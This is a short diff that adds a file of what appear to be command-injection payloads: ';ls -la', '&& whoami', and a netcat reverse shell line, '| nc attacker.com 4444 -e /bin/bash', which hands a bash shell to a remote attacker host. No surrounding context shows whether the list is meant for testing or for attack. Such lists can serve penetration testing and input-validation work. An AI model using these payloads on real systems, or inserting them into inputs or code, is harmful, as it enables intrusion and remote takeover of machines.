@@ -1,0 +1,5 @@
+;ls -la
+
+&& whoami
+
+| nc attacker.com 4444 -e /bin/bash
